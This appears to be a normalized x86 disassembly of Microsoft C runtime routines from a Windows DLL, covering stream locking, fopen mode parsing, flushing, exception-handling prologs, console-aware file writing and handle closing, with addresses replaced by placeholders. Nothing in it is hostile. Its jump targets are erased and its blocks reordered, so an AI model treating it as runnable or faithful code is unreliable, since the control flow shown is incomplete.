cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1000bebf
pop ecx
pop ebp
retn
sub_100092f8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_1000bebf
pop ecx
pop ebp
retn
sub_10009327
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edi [ ecx + 0x7f ]
mov edx 0x4000
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_1000d12a
add esp 0x14
test eax eax
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_1000d4b4
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx edi
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_1000d34e
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_1000d34e
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_1000d34e
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_100095be
push 0x10
push r--data
call sub_10009700
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_1000bf98
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100096e8
mov eax edi
call sub_10009745
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
push 0x38
call sub_1000aaa8
pop ecx
mov ecx [ rw-data ]
mov [ ecx + esi * 4 ] eax
cmp eax ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ eax + esi * 4 ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ eax + esi * 4 ]
call sub_100079a5
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1000928a
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_1000bed6
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_100092f8
pop ecx
pop ecx
sub_10009700
push sub_10009760
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10009760
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008edb
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008edb
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_10009a2b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_100099e2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10008edb
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008edb
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_10009a12
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_10009a2b
mov eax [ ebp + 0xc ]
push rw-data
call sub_1000d560
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10008edb
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_100099f9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008edb
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_100098f0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10009980
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_1000d735
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_1000d754
jmp r-xdata
sub_10009980
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10008edb
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_100098f0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100099e2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10009a12
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10009a44
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_1000c6e0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_100078a5
mov [ eax ] edi
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008edb
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_100078a5
and [ eax ] 0x0
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
jmp r-xdata
push esi
call sub_1000b8e8
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_1000b730
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_1000895f
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_10007892
mov [ eax ] 0x1c
call sub_100078a5
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_100078b8
pop ecx
jmp r-xdata
call sub_10007892
mov [ eax ] 0x9
call sub_100078a5
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_1000bb21
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_1000d757
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_1000d8af
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_1000d8af
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_1000d757
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_1000a141
push 0x10
push r--data
call sub_10009700
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_100078a5
and [ eax ] 0x0
call sub_10007892
mov [ eax ] 0x9
call sub_100078a5
and [ eax ] 0x0
call sub_10007892
mov [ eax ] 0x9
call sub_10007840
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10009745
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1000da39
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10007892
mov [ eax ] 0x9
call sub_100078a5
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_10009a44
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a20d
mov eax [ ebp - 0x1c ]
sub_1000a215
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or eax 0xffffffff
pop ebp
retn
sub_1000a23b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_1000a215
pop ecx
push eax
call sub_1000a141
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_1000a2a3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_1000a23b
pop ecx
test eax eax
je r-xdata
push esi
call sub_1000a2eb
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_1000a215
push eax
call sub_1000dc98
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_1000a2eb
push 0x14
push r--data
call sub_10009700
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_1000bf98
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a3bc
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_10009745
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_1000928a
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_1000a38d
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_1000a2a3
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_1000a2a3
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_1000a3ce
push 0xc
push r--data
call sub_10009700
push 0xe
call sub_1000bf98
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000a435
call sub_10009745
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_100079a5
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_100079a5
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_1000a43e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1000d9d0
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_100078b8
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_1000d9d0
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_1000d9d0
push 0x1
